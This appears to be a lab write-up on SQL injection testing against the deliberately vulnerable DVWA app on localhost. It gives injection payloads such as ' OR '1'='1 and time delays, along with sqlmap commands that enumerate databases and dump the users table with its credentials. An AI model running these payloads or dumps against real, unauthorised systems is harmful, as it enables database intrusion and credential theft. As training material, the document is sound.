# SQL Injection Test Scenarios

This document outlines the test scenarios for SQL Injection vulnerabilities using different techniques. The tests are designed to evaluate the system's ability to handle and mitigate SQL Injection attacks.

## Test Scenarios

## Test Scenarios

| Vulnerability          | Test Case Scenario             | Description                                                                                     | Expected Result                                                                                               |
|------------------------|--------------------------------|-------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------------------|
| **Basic SQL Injection**| Basic SQL Injection Test       | Attempt to inject a basic SQL command (`' OR '1'='1`) into login and search fields to bypass authentication or reveal sensitive data. | The system should not execute the injected SQL and should handle the input safely without leaking data.       |
| **Error-Based SQL Injection** | Error-Based SQL Injection Test | Input SQL commands that cause database errors to probe the structure of the database.             | The system should safely handle errors without exposing any database information.                              |
| **Time-Based SQL Injection**  | Time-Based SQL Injection Test | Input SQL commands that delay responses (e.g., using `WAITFOR DELAY '00:00:05'`) to infer database behavior. | No delay should be observable; the system should handle commands without timing discrepancies.                 |
| **Union-Based SQL Injection** | Union-Based SQL Injection Test | Use SQL UNION statements to attempt retrieval of data from other tables.                           | The system should block data retrieval attempts that are not part of the intended query structure.             |

## Techniques Used
![Techniques](research\techniques.png)
- **B**: Boolean-based blind
- **E**: Error-based
- **U**: Union query-based
- **S**: Stacked queries
- **T**: Time-based blind
- **Q**: Inline queries

## SQLMap Usage

To use SQLMap for testing SQL injection on DVWA, follow these steps:

1. Verify Services:
   Ensure Apache and MySQL services are running:
   ```bash
   sudo systemctl start apache2
   sudo systemctl start mysql
   ```

2. Set DVWA Security Level:
Log in to DVWA and set the security level to "low".

3. Run SQLMap:
Use SQLMap to detect and exploit the SQL injection vulnerability.

- Check for Basic SQL Injection:
  ```
  sqlmap -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=your_session_id" --dbs
  ```

- Test for Time-Based SQLi:
  ```
  sqlmap -u "http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=your_session_id" --dbs --technique=T --time-sec=5

  ```

- Test for Error-Based SQLi:
  ```
  sqlmap -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=your_session_id" -D dvwa -T users --columns --technique=E
  ```

- Test for Union-Based SQLi:
  ```
  sqlmap -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=your_session_id" --technique=U --union-cols=1-10 --dbs
  ```

## SQLMap Command Reference

| SQLMap Option | Command Example | Description |
|---------------|-----------------|-------------|
| `--dbs` | `sqlmap -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=your_session_id" --dbs` | Enumerates all databases available on the target server. |
| `-D dvwa --tables` | `sqlmap -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=your_session_id" -D dvwa --tables` | Lists all tables within the `dvwa` database. |
| `-D dvwa -T users --columns` | `sqlmap -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=your_session_id" -D dvwa -T users --columns` | Lists all columns in the `users` table within the `dvwa` database. |
| `-D dvwa -T users --dump` | `sqlmap -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=your_session_id" -D dvwa -T users --dump` | Dumps all data from the `users` table, potentially revealing sensitive information like credentials. |
| `--current-user` | `sqlmap -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=your_session_id" --current-user` | Retrieves the current database user. |
| `--current-db` | `sqlmap -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=your_session_id" --current-db` | Retrieves the name of the currently selected database. |
| `--banner` | `sqlmap -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=your_session_id" --banner` | Displays the database management system's banner (version, type, etc.). |
| `-D dvwa -T users --search -C user` | `sqlmap -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=your_session_id" -D dvwa -T users --search -C user` | Searches for columns containing the string `user` in their names within the `users` table. |
| `-D dvwa -T users --dump -C user` | `sqlmap -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=your_session_id" -D dvwa -T users --dump -C user` | Dumps only the data from the `user` column(s) in the `users` table. |

## Observations from Testing

During the SQLMap testing, the following was observed:

- SQLMap successfully identified the `id` parameter as vulnerable to SQL injection.
- It used various techniques such as:
  - Boolean-based blind
  - Time-based blind
  - Error-based methods
  to confirm the vulnerability.
- SQLMap was able to:
  - List databases
  - List tables
  - List columns
  - Dump data from the `users` table

These observations demonstrate the effectiveness of SQLMap in detecting and exploiting SQL injection vulnerabilities in DVWA.

## Execution

Each scenario is executed using a specific SQL injection technique to test the system's resilience and response to malicious inputs. The expected results indicate how the system should behave under each type of attack.
